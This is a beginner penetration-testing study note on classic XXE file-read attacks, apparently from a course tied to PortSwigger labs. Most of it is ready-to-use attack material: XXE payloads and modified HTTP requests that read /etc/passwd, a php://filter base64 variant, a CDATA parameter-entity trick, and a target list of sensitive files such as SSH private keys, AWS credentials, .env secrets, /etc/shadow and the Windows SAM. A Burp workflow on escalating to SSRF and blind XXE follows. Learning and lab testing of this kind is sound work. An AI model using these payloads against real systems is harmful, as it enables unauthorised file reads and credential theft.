---
tags: [vapt, xxe, beginner]
difficulty: beginner
module: "14 - XXE"
topic: "14.03 Classic XXE — File Read (/etc/passwd)"
portswigger_labs: ["Exploiting XXE using external entities to retrieve files", "Exploiting XXE to perform SSRF attacks"]
---

# 14.03 — Classic XXE: File Read

## The Basic XXE Payload

```xml
<!-- BASIC XXE — READ /etc/passwd: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- IF APP ECHOES BACK THE <data> VALUE IN RESPONSE:
  <data>
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ...
  </data>
  
  XXE CONFIRMED!
-->
```

---

## Finding XXE Injection Points

```bash
# LOOK FOR XML IN BURP HTTP HISTORY:
# Filter: Request Content-Type = text/xml OR application/xml OR application/soap+xml

# COMMON ENDPOINTS:
#   POST /api/parse-xml
#   POST /import
#   POST /upload
#   POST /soap/endpoint
#   POST /xmlrpc.php

# INTERCEPT A NORMAL REQUEST, ADD DOCTYPE:
# Original:
POST /api/stock HTTP/1.1
Content-Type: application/xml

<stockCheck><productId>1</productId></stockCheck>

# Modified (XXE payload):
POST /api/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>

# IF /etc/passwd CONTENT APPEARS IN RESPONSE → XXE CONFIRMED!
```

---

## High-Value Files to Read

```bash
# LINUX / UNIX:
file:///etc/passwd              # user accounts
file:///etc/shadow              # password hashes (if readable)
file:///etc/hosts               # hostname mappings
file:///etc/hostname            # server hostname
file:///etc/os-release          # OS version
file:///proc/self/environ       # environment variables (may have secrets!)
file:///proc/self/cmdline       # process command line
file:///proc/net/arp            # network ARP table (find internal IPs)
file:///proc/net/tcp            # TCP connections (find services)
file:///var/www/html/config.php # web app config
file:///var/www/html/wp-config.php  # WordPress config (DB password!)
file:///home/ubuntu/.ssh/id_rsa     # SSH private key
file:///root/.ssh/id_rsa            # root SSH key
file:///root/.aws/credentials       # AWS credentials
file:///home/ubuntu/.aws/credentials
file:///etc/nginx/nginx.conf        # nginx config
file:///etc/apache2/apache2.conf    # apache config

# APPLICATION CONFIG FILES:
file:///var/www/html/.env           # Laravel/Node .env (all secrets!)
file:///app/.env
file:///app/config/database.php
file:///WEB-INF/web.xml             # Java web app
file:///WEB-INF/classes/config.properties

# WINDOWS:
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config   # IIS config
file:///C:/Windows/System32/config/SAM  # SAM (usually locked)
```

---

## Testing with Different Element Values

```xml
<!-- IF ENTITY IN ROOT ELEMENT DOESN'T ECHO BACK,
     TRY OTHER ELEMENTS: -->

<!-- ORIGINAL REQUEST: -->
<user>
  <username>test</username>
  <password>test</password>
  <email>test@test.com</email>
</user>

<!-- TRY EACH FIELD: -->
<user>
  <username>&xxe;</username>   <!-- try here -->
  <password>test</password>
  <email>test@test.com</email>
</user>

<user>
  <username>test</username>
  <password>&xxe;</password>   <!-- or here -->
  <email>test@test.com</email>
</user>

<!-- WHICHEVER FIELD IS REFLECTED IN THE RESPONSE → USE THAT! -->
```

---

## JSON to XML Conversion (Hidden XML)

```bash
# SOME APPS ACCEPT BOTH JSON AND XML:
# Original (JSON):
POST /api/user HTTP/1.1
Content-Type: application/json

{"username": "test", "email": "test@test.com"}

# Try switching to XML:
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <username>&xxe;</username>
  <email>test@test.com</email>
</root>

# IF APP PROCESSES THIS AS XML → XXE!
# (Some frameworks auto-detect content type and parse accordingly)
```

---

## Reading Files with Special Characters

```xml
<!-- PROBLEM: Some file contents have <, >, & which break XML parsing -->
<!-- SOLUTION: Use CDATA section to wrap content -->

<!-- CDATA WRAPPING VIA PARAMETER ENTITIES: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/config.php">
  <!ENTITY % end "]]>">
  <!ENTITY % wrap "<!ENTITY xxe '%start;%file;%end;'>">
]>
<!-- This constructs: <![CDATA[FILECONTENTS]]> which prevents XML parsing of content -->
<!-- NOTE: This requires external DTD! See note 14.06 for how to host one -->

<!-- SIMPLER APPROACH: Use PHP filter wrapper (if PHP backend): -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
<!-- → Returns base64-encoded file contents → no XML breaking chars! -->
<!-- Decode locally: echo "BASE64" | base64 -d -->
```

---

## Burp Suite Workflow for XXE

```
BURP METHODOLOGY:

1. FIND XML REQUEST IN HISTORY:
   HTTP History → filter for XML content type

2. SEND TO REPEATER:
   Right-click → Send to Repeater

3. MODIFY REQUEST:
   Add DOCTYPE and entity to the XML body

4. SEND AND CHECK RESPONSE:
   Look for file contents in the response

5. ESCALATE:
   Read more sensitive files
   Try SSRF with http:// entities
   Try blind XXE if not reflected

SCANNER:
   Active scan → "XML external entity injection" check
   Burp Pro automatically tests for XXE!
```

---

## Related Notes
- [[01 - What is XXE]] — fundamentals
- [[02 - XML Basics and DTD]] — XML entity syntax
- [[04 - XXE via SVG Upload]] — file upload vector
- [[06 - Blind XXE OOB]] — when response doesn't reflect entity
- [[08 - XXE to SSRF]] — using xxe for SSRF
- [[09 - XXE WAF Bypass]] — bypass filters
